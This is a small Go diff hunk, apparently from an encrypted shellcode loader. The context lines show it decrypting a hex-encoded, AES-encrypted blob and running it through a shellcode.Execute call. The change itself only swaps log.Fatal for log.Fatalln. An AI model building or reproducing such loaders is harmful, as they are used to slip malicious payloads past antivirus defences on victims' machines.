@@ -23,18 +23,18 @@ func main() {
 
 	cipherData, err := hex.DecodeString(sc)
 	if err != nil {
-		log.Fatal(err)
+		log.Fatalln(err)
 	}
 	hash := sha256.New()
 	hash.Write([]byte(key))
 	aesKey := hash.Sum(nil)
 	s, err := aes.CBCDecrypt(cipherData, aesKey, aesKey[:aes.IVSize])
 	if err != nil {
-		log.Fatal(err)
+		log.Fatalln(err)
 	}
 
 	err = shellcode.Execute(method, s)
 	if err != nil {
-		log.Fatal(err)
+		log.Fatalln(err)
 	}
 }
